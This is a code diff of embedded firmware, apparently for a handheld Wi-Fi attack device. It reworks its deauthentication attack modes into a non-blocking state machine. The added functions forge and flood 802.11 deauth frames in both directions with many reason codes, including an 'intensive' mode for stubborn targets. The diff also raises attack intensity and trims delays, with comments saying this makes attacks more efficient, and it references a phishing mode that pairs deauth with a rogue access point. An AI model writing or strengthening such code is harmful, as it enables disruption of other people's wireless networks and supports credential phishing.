@@ -303,7 +303,7 @@ int attackstate = 0;
 int menustate = 0;
 int deauthstate = 0; 
 int scrollindex = 0;
-int perdeauth = 3;
+int perdeauth = 10;  // 增加攻击强度
 int num = 0; // 添加全局变量声明
 
 // 首页分页起始索引（与攻击页相同的滚动效果）
@@ -347,6 +347,72 @@ bool quick_capture_active = false;
 bool quick_capture_completed = false;
 int quick_capture_mode = 0; // 0=主动, 1=被动, 2=高效
 unsigned long quick_capture_start_time = 0;
+
+// ============ 非阻塞攻击状态管理系统 ============
+// 攻击运行状态枚举
+enum AttackMode {
+  ATTACK_IDLE = 0,
+  ATTACK_SINGLE,
+  ATTACK_MULTI,
+  ATTACK_AUTO_SINGLE,
+  ATTACK_AUTO_MULTI,
+  ATTACK_ALL,
+  ATTACK_BEACON_DEAUTH
+};
+
+// 非阻塞攻击状态管理
+struct DeauthAttackState {
+  AttackMode mode;
+  bool running;
+  
+  // 时间管理
+  unsigned long lastPacketMs;
+  unsigned long lastUIUpdateMs;
+  unsigned long lastButtonCheckMs;
+  unsigned long lastLEDToggleMs;
+  unsigned long lastScanMs;
+  
+  // 目标索引管理
+  size_t currentTargetIndex;
+  size_t currentChannelBucketIndex;
+  size_t currentBssidIndexInBucket;
+  
+  // 统计
+  int packetCount;
+  bool ledState;
+  
+  // 配置
+  unsigned int packetsPerCycle;
+  unsigned int uiUpdateInterval;
+  unsigned int buttonCheckInterval;
+  unsigned int ledBlinkInterval;
+  
+  // 信道缓存
+  int lastChannel;
+  bool channelSet;
+};
+
+// 全局攻击状态实例
+DeauthAttackState g_deauthState = {
+  .mode = ATTACK_IDLE,
+  .running = false,
+  .lastPacketMs = 0,
+  .lastUIUpdateMs = 0,
+  .lastButtonCheckMs = 0,
+  .lastLEDToggleMs = 0,
+  .lastScanMs = 0,
+  .currentTargetIndex = 0,
+  .currentChannelBucketIndex = 0,
+  .currentBssidIndexInBucket = 0,
+  .packetCount = 0,
+  .ledState = false,
+  .packetsPerCycle = 10,
+  .uiUpdateInterval = 500,
+  .buttonCheckInterval = 100,
+  .ledBlinkInterval = 500,
+  .lastChannel = -1,
+  .channelSet = false
+};
 unsigned long quick_capture_end_time = 0;
 
 // 钓鱼模式一次性锁：关闭后禁止再次启动，需重启设备
@@ -380,6 +446,8 @@ static bool webtest_border_flash_visible = true;
 	static uint8_t phishingTargetBSSID[6] = {0};
 	static unsigned long lastPhishingDeauthMs = 0;
 	static unsigned long lastPhishingBroadcastMs = 0;
+	static int phishingDeauthInterval = 500; // 动态间隔：根据客户端连接情况调整
+	static int phishingBatchSize = 10; // 动态批次数：根据客户端连接情况调整
 
 // 攻击检测边框效果变量
 static bool detect_border_always_on = false;
@@ -1872,6 +1940,124 @@ inline __attribute__((always_inline)) void sendDeauthBurstToBssidUs(const uint8_
       if (interFrameDelayUs > 0) delayMicroseconds(interFrameDelayUs);
     }
   }
+}
+
+// ============ 优化的非阻塞批量发送函数 ============
+// 全局增强模式开关
+bool g_enhancedDeauthMode = true; // 默认启用增强模式
+
+// 高效批量发送：预构建帧，减少重复memcpy
+inline void sendDeauthBatch(const uint8_t* bssid, int batchSize, int &packetCount) {
+  static DeauthFrame frames[3]; // 静态缓存3个原因码的帧
+  static bool initialized = false;
+  static uint8_t lastBssid[6] = {0};
+  
+  // 检查是否需要重新初始化帧（BSSID变化时）
+  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
+    for (int i = 0; i < 3; i++) {
+      memcpy(frames[i].source, bssid, 6);
+      memcpy(frames[i].access_point, bssid, 6);
+      memcpy(frames[i].destination, BROADCAST_MAC, 6);
+      frames[i].reason = DEAUTH_REASONS[i];
+    }
+    memcpy(lastBssid, bssid, 6);
+    initialized = true;
+  }
+  
+  // 无延时连续发送
+  for (int batch = 0; batch < batchSize; batch++) {
+    for (int i = 0; i < 3; i++) {
+      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
+      packetCount++;
+    }
+  }
+}
+
+// 增强版批量发送：双向攻击，更强效果
+inline void sendDeauthBatchEnhanced(const uint8_t* bssid, int batchSize, int &packetCount) {
+  static DeauthFrame frames[6]; // 增加到6帧：3个原因码 x 2个方向
+  static bool initialized = false;
+  static uint8_t lastBssid[6] = {0};
+  
+  // 检查是否需要重新初始化帧（BSSID变化时）
+  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
+    // AP -> Client 方向（原有）
+    for (int i = 0; i < 3; i++) {
+      memcpy(frames[i].source, bssid, 6);
+      memcpy(frames[i].access_point, bssid, 6);
+      memcpy(frames[i].destination, BROADCAST_MAC, 6);
+      frames[i].reason = DEAUTH_REASONS[i];
+    }
+    // Client -> AP 方向（增强）
+    for (int i = 0; i < 3; i++) {
+      memcpy(frames[i+3].source, BROADCAST_MAC, 6);
+      memcpy(frames[i+3].access_point, bssid, 6);
+      memcpy(frames[i+3].destination, bssid, 6);
+      frames[i+3].reason = DEAUTH_REASONS[i];
+    }
+    memcpy(lastBssid, bssid, 6);
+    initialized = true;
+  }
+  
+  // 增强的发送逻辑：每批次发送多轮
+  for (int batch = 0; batch < batchSize; batch++) {
+    // 双向发送，增加成功率
+    for (int i = 0; i < 6; i++) {
+      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
+      packetCount++;
+    }
+  }
+}
+
+// 针对顽固目标的增强版本
+inline void sendDeauthBurstIntensive(const uint8_t* bssid, int burstCount, int &packetCount) {
+  DeauthFrame frame;
+  const uint16_t intensiveReasons[] = {1, 2, 3, 4, 5, 6, 7, 8, 15, 16}; // 10个原因码
+  
+  for (int burst = 0; burst < burstCount; burst++) {
+    // AP -> Broadcast
+    for (int r = 0; r < 10; r++) {
+      memcpy(frame.source, bssid, 6);
+      memcpy(frame.access_point, bssid, 6);
+      memcpy(frame.destination, BROADCAST_MAC, 6);
+      frame.reason = intensiveReasons[r];
+      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
+      packetCount++;
+    }
+    // Broadcast -> AP
+    for (int r = 0; r < 10; r++) {
+      memcpy(frame.source, BROADCAST_MAC, 6);
+      memcpy(frame.access_point, bssid, 6);
+      memcpy(frame.destination, bssid, 6);
+      frame.reason = intensiveReasons[r];
+      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
+      packetCount++;
+    }
+  }
+}
+
+// 优化的信道设置函数（避免重复设置）
+inline void setChannelOptimized(int channel) {
+  if (!g_deauthState.channelSet || g_deauthState.lastChannel != channel) {
+    wext_set_channel(WLAN0_NAME, channel);
+    g_deauthState.lastChannel = channel;
+    g_deauthState.channelSet = true;
+  }
+}
+
+// 统一的攻击停止函数
+void stopAttack() {
+  g_deauthState.running = false;
+  g_deauthState.mode = ATTACK_IDLE;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
+  
+  // 关闭LED
+  digitalWrite(LED_R, LOW);
+  digitalWrite(LED_G, LOW);
+  digitalWrite(LED_B, LOW);
+  
+  Serial.println("=== 攻击已停止 ===");
 }
 // timing variables
 unsigned long lastDownTime = 0;
@@ -3771,205 +3957,294 @@ void updateScanDisplay(const char* scanType) {
   
   display.display();
 }
-void Single() {
-  Serial.println("=== 启动单一攻击 ===");
-  Serial.println("攻击模式: 单一攻击");
-  Serial.println("攻击强度: " + String(perdeauth));
+// ============ 非阻塞攻击处理函数 ============
+// 处理信道桶的状态机 - 增强版
+void processChannelBuckets() {
+  // 状态机处理信道桶
+  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
+    g_deauthState.currentChannelBucketIndex = 0;
+    return;
+  }
   
-  showAttackStatusPage("单一攻击中");
+  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
+  if (bucket.empty()) {
+    g_deauthState.currentChannelBucketIndex++;
+    return;
+  }
   
-  // LED控制：红灯闪烁
-  startAttackLED();
-
-  int packetCount = 0;
+  // 设置信道一次，处理该桶的所有BSSID
+  if (g_deauthState.currentBssidIndexInBucket == 0) {
+    setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
+  }
   
-  while (true) {
-    // 更新攻击状态显示
-    showAttackStatusPage("单一攻击中");
-    
-    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
-      digitalWrite(LED_R, LOW);
-      digitalWrite(LED_G, LOW);
-      digitalWrite(LED_B, LOW);
-      delay(200);
-      // 显示确认弹窗
-      if (showConfirmModal("确认停止攻击")) {
-        return; // 确认停止攻击
-      }
-      // 取消则继续攻击，重新启动LED
-      startAttackLED();
-    }
-    
-    if (SelectedVector.empty()) {
-      // 单目标：直接对当前高亮网络进行burst发送
-      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
-      sendDeauthBurstToBssid(scan_results[scrollindex].bssid, perdeauth, packetCount, 0);
-      if (packetCount >= 1000) {
-        digitalWrite(LED_R, HIGH);
-        delay(50);
-        digitalWrite(LED_R, LOW);
-        packetCount = 0;
-      }
-    } else {
-      // 多目标：按信道分组，减少频繁切换信道（复用缓存）
-      channelBucketsCache.clearBuckets();
-      for (int selectedIndex : SelectedVector) {
-        if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
-          channelBucketsCache.add(scan_results[selectedIndex].channel,
-                                  scan_results[selectedIndex].bssid);
-        }
-      }
-      const unsigned int interFrameDelayUs = 250; // 微秒级细微延时
-      for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
-        if (channelBucketsCache.buckets[chIdx].empty()) continue;
-        wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
-        for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
-          if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
-            digitalWrite(LED_R, LOW);
-            digitalWrite(LED_G, LOW);
-            digitalWrite(LED_B, LOW);
-            delay(200);
-            // 显示确认弹窗
-            if (showConfirmModal("确认停止攻击")) {
-              return; // 确认停止攻击
-            }
-            // 取消则继续攻击，重新启动LED
-            startAttackLED();
-          }
-          sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
-          if (packetCount >= 1000) {
-            digitalWrite(LED_R, HIGH);
-            delay(50);
-            digitalWrite(LED_R, LOW);
-            packetCount = 0;
-          }
-        }
-      }
-      // 处理未在 allChannels 中的信道
-      for (const auto &eb : channelBucketsCache.extras) {
-        if (eb.bssids.empty()) continue;
-        wext_set_channel(WLAN0_NAME, eb.channel);
-        for (const uint8_t *bssidPtr : eb.bssids) {
-          if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)) {
-            digitalWrite(LED_R, LOW);
-            digitalWrite(LED_G, LOW);
-            digitalWrite(LED_B, LOW);
-            delay(200);
-            // 显示确认弹窗
-            if (showConfirmModal("确认停止攻击")) {
-              return; // 确认停止攻击
-            }
-            // 取消则继续攻击，重新启动LED
-            startAttackLED();
-          }
-          sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
-          if (packetCount >= 1000) {
-            digitalWrite(LED_R, HIGH);
-            delay(50);
-            digitalWrite(LED_R, LOW);
-            packetCount = 0;
-          }
-        }
-      }
-    }
+  // 处理当前BSSID
+  if (g_deauthState.currentBssidIndexInBucket < bucket.size()) {
+    sendDeauthBatch(bucket[g_deauthState.currentBssidIndexInBucket], 
+                    g_deauthState.packetsPerCycle, 
+                    g_deauthState.packetCount);
+    g_deauthState.currentBssidIndexInBucket++;
+  } else {
+    // 当前桶处理完，移到下一个
+    g_deauthState.currentBssidIndexInBucket = 0;
+    g_deauthState.currentChannelBucketIndex++;
   }
 }
 
-void Multi() {
-  Serial.println("=== 启动多重攻击 ===");
-  Serial.println("攻击模式: 多重攻击");
-  Serial.println("攻击强度: " + String(perdeauth));
-  
-  showAttackStatusPage("多重攻击中");
-  
-  // LED控制：红灯闪烁
-  startAttackLED();
-  
-  int packetCount = 0;
-  while (true) {
-
-    // 更新攻击状态显示
-    showAttackStatusPage("多重攻击中");
-
-    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
-      digitalWrite(LED_R, LOW);
-      digitalWrite(LED_G, LOW);
-      digitalWrite(LED_B, LOW);
-      delay(200);
-      // 显示确认弹窗
-      if (showConfirmModal("确认停止攻击")) {
-        return; // 确认停止攻击
+// 增强版信道桶处理 - 一次处理完整信道桶
+void processChannelBucketsEnhanced() {
+  // 检查是否处理完所有桶
+  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
+    // 处理extras信道
+    if (g_deauthState.currentTargetIndex < channelBucketsCache.extras.size()) {
+      auto& eb = channelBucketsCache.extras[g_deauthState.currentTargetIndex];
+      if (!eb.bssids.empty()) {
+        setChannelOptimized(eb.channel);
+        for (const uint8_t *bssidPtr : eb.bssids) {
+          if (g_enhancedDeauthMode) {
+            sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
+          } else {
+            sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
+          }
+        }
       }
-      // 取消则继续攻击，重新启动LED
-      startAttackLED();
+      g_deauthState.currentTargetIndex++;
+    } else {
+      // 全部处理完，重置并开始新一轮
+      g_deauthState.currentChannelBucketIndex = 0;
+      g_deauthState.currentTargetIndex = 0;
     }
-    if (SelectedVector.empty()) {
-      // 如果没有目标，稍作等待避免空转
-      delay(50);
-      continue;
+    return;
+  }
+  
+  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
+  if (bucket.empty()) {
+    g_deauthState.currentChannelBucketIndex++;
+    return;
+  }
+  
+  // 设置信道
+  setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
+  
+  // 一次处理该信道的所有BSSID（而不是只处理一个）
+  for (const uint8_t *bssidPtr : bucket) {
+    if (g_enhancedDeauthMode) {
+      sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
+    } else {
+      sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
     }
-    // 按信道分组，减少频繁切换信道
+  }
+  
+  // 移到下一个信道桶
+  g_deauthState.currentChannelBucketIndex++;
+}
+
+// 启动单一攻击
+void startSingleAttack() {
+  g_deauthState.mode = ATTACK_SINGLE;
+  g_deauthState.running = true;
+  g_deauthState.currentTargetIndex = 0;
+  g_deauthState.packetCount = 0;
+  g_deauthState.lastPacketMs = 0;
+  g_deauthState.lastUIUpdateMs = 0;
+  g_deauthState.lastButtonCheckMs = 0;
+  g_deauthState.lastLEDToggleMs = 0;
+  g_deauthState.ledState = false;
+  g_deauthState.packetsPerCycle = perdeauth;
+  g_deauthState.uiUpdateInterval = 500;
+  g_deauthState.buttonCheckInterval = 100;
+  g_deauthState.ledBlinkInterval = 500;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
+  
+  // 预处理目标列表（如需要）
+  if (!SelectedVector.empty()) {
     channelBucketsCache.clearBuckets();
-    for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
-        channelBucketsCache.add(scan_results[selectedIndex].channel,
-                                scan_results[selectedIndex].bssid);
+    for (int idx : SelectedVector) {
+      if (idx >= 0 && idx < scan_results.size()) {
+        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
       }
     }
-    const unsigned int interFrameDelayUs = 250; // 微秒级细微延时
-    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
-      if (channelBucketsCache.buckets[chIdx].empty()) continue;
-      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
-      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
-        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-          digitalWrite(LED_R, LOW);
-          digitalWrite(LED_G, LOW);
-          digitalWrite(LED_B, LOW);
-          delay(200);
-          // 显示确认弹窗
-          if (showConfirmModal("确认停止攻击")) {
-            return; // 确认停止攻击
-          }
-          // 取消则继续攻击，重新启动LED
-          startAttackLED();
-        }
-        // 使用微秒级 burst（标准原因序列），减少调用开销并提升效率
-        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
-        if (packetCount >= 200) {
-          digitalWrite(LED_R, HIGH);
-          delay(30);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
-        }
+    g_deauthState.currentChannelBucketIndex = 0;
+    g_deauthState.currentBssidIndexInBucket = 0;
+    
+    // 根据目标数量动态调整参数
+    int targetCount = SelectedVector.size();
+    if (targetCount > 5) {
+      g_deauthState.packetsPerCycle = perdeauth * 2; // 多目标时增加批次
+    } else {
+      g_deauthState.packetsPerCycle = perdeauth * 3; // 少量目标时更密集
+    }
+  }
+  
+  Serial.println("=== 启动单一攻击（非阻塞） ===");
+  Serial.println("增强模式: " + String(g_enhancedDeauthMode ? "启用" : "禁用"));
+  showAttackStatusPage("单一攻击中");
+  startAttackLED();
+}
+
+// 处理单一攻击
+void processSingleAttack() {
+  unsigned long now = millis();
+  
+  // LED闪烁（非阻塞）
+  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
+    g_deauthState.ledState = !g_deauthState.ledState;
+    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
+    g_deauthState.lastLEDToggleMs = now;
+  }
+  
+  // 按钮检测（降低频率）
+  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+      if (showConfirmModal("确认停止攻击")) {
+        stopAttack();
+        return;
+      }
+      startAttackLED();
+      showAttackStatusPage("单一攻击中");
+    }
+    g_deauthState.lastButtonCheckMs = now;
+  }
+  
+  // UI更新（降低频率）
+  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
+    showAttackStatusPage("单一攻击中");
+    g_deauthState.lastUIUpdateMs = now;
+  }
+  
+  // 发送攻击包（每次处理固定数量）
+  if (SelectedVector.empty()) {
+    // 单目标
+    setChannelOptimized(scan_results[scrollindex].channel);
+    if (g_enhancedDeauthMode) {
+      sendDeauthBatchEnhanced(scan_results[scrollindex].bssid, 
+                              g_deauthState.packetsPerCycle, 
+                              g_deauthState.packetCount);
+    } else {
+      sendDeauthBatch(scan_results[scrollindex].bssid, 
+                      g_deauthState.packetsPerCycle, 
+                      g_deauthState.packetCount);
+    }
+  } else {
+    // 多目标：按信道分组批量发送（使用增强版）
+    processChannelBucketsEnhanced();
+  }
+  
+  // LED反馈
+  if (g_deauthState.packetCount >= 1000) {
+    digitalWrite(LED_R, HIGH);
+    delay(5); // 减少LED反馈延时，提高攻击效率
+    digitalWrite(LED_R, LOW);
+    g_deauthState.packetCount = 0;
+  }
+}
+
+// 兼容包装器：保持原函数签名
+void Single() {
+  startSingleAttack();
+  // 等待攻击完成或用户停止
+  while (g_deauthState.running) {
+    processSingleAttack();
+  }
+}
+
+// 启动多重攻击
+void startMultiAttack() {
+  g_deauthState.mode = ATTACK_MULTI;
+  g_deauthState.running = true;
+  g_deauthState.currentTargetIndex = 0;
+  g_deauthState.packetCount = 0;
+  g_deauthState.lastPacketMs = 0;
+  g_deauthState.lastUIUpdateMs = 0;
+  g_deauthState.lastButtonCheckMs = 0;
+  g_deauthState.lastLEDToggleMs = 0;
+  g_deauthState.ledState = false;
+  g_deauthState.packetsPerCycle = perdeauth;
+  g_deauthState.uiUpdateInterval = 500;
+  g_deauthState.buttonCheckInterval = 100;
+  g_deauthState.ledBlinkInterval = 500;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
+  
+  // 预处理目标列表
+  if (!SelectedVector.empty()) {
+    channelBucketsCache.clearBuckets();
+    for (int idx : SelectedVector) {
+      if (idx >= 0 && idx < scan_results.size()) {
+        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
       }
     }
-    // 处理未在 allChannels 中的信道
-    for (const auto &eb : channelBucketsCache.extras) {
-      if (eb.bssids.empty()) continue;
-      wext_set_channel(WLAN0_NAME, eb.channel);
-      for (const uint8_t *bssidPtr : eb.bssids) {
-        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-          digitalWrite(LED_R, LOW);
-          digitalWrite(LED_G, LOW);
-          digitalWrite(LED_B, LOW);
-          delay(200);
-          // 显示确认弹窗
-          if (showConfirmModal("确认停止攻击")) {
-            return; // 确认停止攻击
-          }
-          // 取消则继续攻击，重新启动LED
-          startAttackLED();
-        }
-        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
-        if (packetCount >= 200) {
-          digitalWrite(LED_R, HIGH);
-          delay(30);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
-        }
-      }
+    g_deauthState.currentChannelBucketIndex = 0;
+    g_deauthState.currentBssidIndexInBucket = 0;
+    
+    // 根据目标数量动态调整参数
+    int targetCount = SelectedVector.size();
+    if (targetCount > 5) {
+      g_deauthState.packetsPerCycle = perdeauth * 2; // 多目标时增加批次
+    } else {
+      g_deauthState.packetsPerCycle = perdeauth * 3; // 少量目标时更密集
     }
-    delay(10);
+  }
+  
+  Serial.println("=== 启动多重攻击（非阻塞） ===");
+  Serial.println("增强模式: " + String(g_enhancedDeauthMode ? "启用" : "禁用"));
+  showAttackStatusPage("多重攻击中");
+  startAttackLED();
+}
+
+// 处理多重攻击
+void processMultiAttack() {
+  unsigned long now = millis();
+  
+  // LED闪烁（非阻塞）
+  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
+    g_deauthState.ledState = !g_deauthState.ledState;
+    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
+    g_deauthState.lastLEDToggleMs = now;
+  }
+  
+  // 按钮检测（降低频率）
+  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+      if (showConfirmModal("确认停止攻击")) {
+        stopAttack();
+        return;
+      }
+      startAttackLED();
+      showAttackStatusPage("多重攻击中");
+    }
+    g_deauthState.lastButtonCheckMs = now;
+  }
+  
+  // UI更新（降低频率）
+  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
+    showAttackStatusPage("多重攻击中");
+    g_deauthState.lastUIUpdateMs = now;
+  }
+  
+  // 检查是否有目标
+  if (SelectedVector.empty()) {
+    return; // 没有目标，跳过攻击
+  }
+  
+  // 使用增强版信道桶处理多目标
+  processChannelBucketsEnhanced();
+  
+  // LED反馈
+  if (g_deauthState.packetCount >= 200) {
+    digitalWrite(LED_R, HIGH);
+    delay(5); // 减少LED反馈延时，提高攻击效率
+    digitalWrite(LED_R, LOW);
+    g_deauthState.packetCount = 0;
+  }
+}
+
+// 兼容包装器：保持原函数签名
+void Multi() {
+  startMultiAttack();
+  // 等待攻击完成或用户停止
+  while (g_deauthState.running) {
+    processMultiAttack();
   }
 }
 void updateSmartTargets() {
@@ -4006,26 +4281,29 @@ void updateSmartTargets() {
     Serial.println("Scan failed, restored previous results");
   }
 }
-void AutoSingle() {
-  Serial.println("=== 启动自动单一攻击 ===");
-  Serial.println("攻击模式: 自动单一攻击");
-  Serial.println("攻击强度: " + String(perdeauth));
-  
-  showAttackStatusPage("自动单一攻击中");
-  
-  // LED控制：红灯闪烁
-  startAttackLED();
-
-  unsigned long prevBlink = 0;
-  bool redState = true;
-  const int blinkInterval = 600;
-  unsigned long buttonCheckTime = 0;
-  const int buttonCheckInterval = 120; // 检查按钮的间隔
+// 启动自动单一攻击
+void startAutoSingleAttack() {
+  g_deauthState.mode = ATTACK_AUTO_SINGLE;
+  g_deauthState.running = true;
+  g_deauthState.currentTargetIndex = 0;
+  g_deauthState.packetCount = 0;
+  g_deauthState.lastPacketMs = 0;
+  g_deauthState.lastUIUpdateMs = 0;
+  g_deauthState.lastButtonCheckMs = 0;
+  g_deauthState.lastLEDToggleMs = 0;
+  g_deauthState.lastScanMs = 0;
+  g_deauthState.ledState = false;
+  g_deauthState.packetsPerCycle = 3; // 自动攻击使用较小批次
+  g_deauthState.uiUpdateInterval = 500;
+  g_deauthState.buttonCheckInterval = 120;
+  g_deauthState.ledBlinkInterval = 600;
+  g_deauthState.channelSet = false;
+  g_deauthState.lastChannel = -1;
   
   // 初始化目标列表
   if (smartTargets.empty() && !SelectedVector.empty()) {
     for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
+      if (selectedIndex >= 0 && selectedIndex < scan_results.size()) {
         TargetInfo target;
         memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
         target.channel = scan_results[selectedIndex].channel;
@@ -4033,106 +4311,107 @@ void AutoSingle() {
         smartTargets.push_back(target);
       }
     }
-    lastScanTime = millis();
+    g_deauthState.lastScanMs = millis();
   }
-
-  while (true) {
-    // 更新攻击状态显示
-    showAttackStatusPage("自动单一攻击中");
-
-    unsigned long currentTime = millis();
-    
-    // LED闪烁控制
-    if (currentTime - prevBlink >= blinkInterval) {
-      redState = !redState;
-      digitalWrite(LED_R, redState ? HIGH : LOW);
-      prevBlink = currentTime;
-    }
-
-    // 按钮检查（增加检查间隔以减少CPU负载）
-    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
-      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-        digitalWrite(LED_R, LOW);
-        digitalWrite(LED_G, LOW);
-        digitalWrite(LED_B, LOW);
-        delay(200);
-        // 显示确认弹窗
-        if (showConfirmModal("确认停止攻击")) {
-          return; // 确认停止攻击
-        }
-        // 取消则继续攻击，重新启动LED
-        startAttackLED();
-      }
-      buttonCheckTime = currentTime;
-    }
-
-    // 定期扫描更新（每10分钟）
-    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
-      std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
-      updateSmartTargets();
-      if (scan_results.empty()) {
-        scan_results = std::move(backup); // 如果扫描失败，恢复备份
-      }
-      lastScanTime = currentTime;
-    }
-
-    int packetCount = 0;
-
-if (smartTargets.empty()) {
-  // 如果没有目标，等待一段时间再继续
-  delay(100);
-  continue;
-}
-     // 攻击目标
-    for (const auto& target : smartTargets) {
-      if (target.active) {  // 只攻击活跃目标
-        wext_set_channel(WLAN0_NAME, target.channel);
-        
-        // 使用 burst 版本减少逐帧调用开销
-        sendDeauthBurstToBssid(target.bssid, 3, packetCount, 5);
-        if (packetCount >= 500) {
-          digitalWrite(LED_R, HIGH);
-          delay(50);
-          digitalWrite(LED_R, LOW);
-          packetCount = 0;
-        }
-      }
-    
-    // 检查按钮状态
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      digitalWrite(LED_R, LOW);
-      digitalWrite(LED_G, LOW);
-      digitalWrite(LED_B, LOW);
-      delay(200);
-      // 显示确认弹窗
-      if (showConfirmModal("确认停止攻击")) {
-        return; // 确认停止攻击
-      }
-      // 取消则继续攻击，重新启动LED
-      startAttackLED();
-    }
-  }
-    delay(10);
-  }
-}
-void AutoMulti() {
-  Serial.println("=== 启动自动多重攻击 ===");
-  Serial.println("攻击模式: 自动多重攻击");
-  Serial.println("攻击强度: " + String(perdeauth));
   
-  showAttackStatusPage("自动多重攻击中");
-  
-  // LED控制：红灯闪烁
+  Serial.println("=== 启动自动单一攻击（非阻塞） ===");
+  showAttackStatusPage("自动单一攻击中");
   startAttackLED();
-  unsigned long prevBlink = 0;
-  bool redState = true;
-  const int blinkInterval = 600;
-  unsigned long buttonCheckTime = 0;
-  const int buttonCheckInterval = 120;
-  static size_t currentTargetIndex = 0;
+}
+
+// 处理自动单一攻击
+void processAutoSingleAttack() {
+  unsigned long now = millis();
+  
+  // LED闪烁（非阻塞）
+  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
+    g_deauthState.ledState = !g_deauthState.ledState;
+    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
+    g_deauthState.lastLEDToggleMs = now;
+  }
+  
+  // 按钮检测（降低频率）
+  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+      if (showConfirmModal("确认停止攻击")) {
+        stopAttack();
+        return;
+      }
+      startAttackLED();
+      showAttackStatusPage("自动单一攻击中");
+    }
+    g_deauthState.lastButtonCheckMs = now;
+  }
+  
+  // UI更新（降低频率）
+  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
+    showAttackStatusPage("自动单一攻击中");
+    g_deauthState.lastUIUpdateMs = now;
+  }
+  
+  // 定期扫描更新（每10分钟）
+  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
+    std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
+    updateSmartTargets();
+    if (scan_results.empty()) {
+      scan_results = std::move(backup); // 如果扫描失败，恢复备份
+    }
+    g_deauthState.lastScanMs = now;
+  }
+  
+  // 攻击目标
+  if (smartTargets.empty()) {
+    return; // 没有目标，跳过攻击
+  }
+  
+  for (const auto& target : smartTargets) {
+    if (target.active) {  // 只攻击活跃目标
+      setChannelOptimized(target.channel);
+      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
+      
+      // LED反馈
+      if (g_deauthState.packetCount >= 500) {
+        digitalWrite(LED_R, HIGH);
+        delay(5); // 减少LED反馈延时，提高攻击效率
+        digitalWrite(LED_R, LOW);
+        g_deauthState.packetCount = 0;
+      }
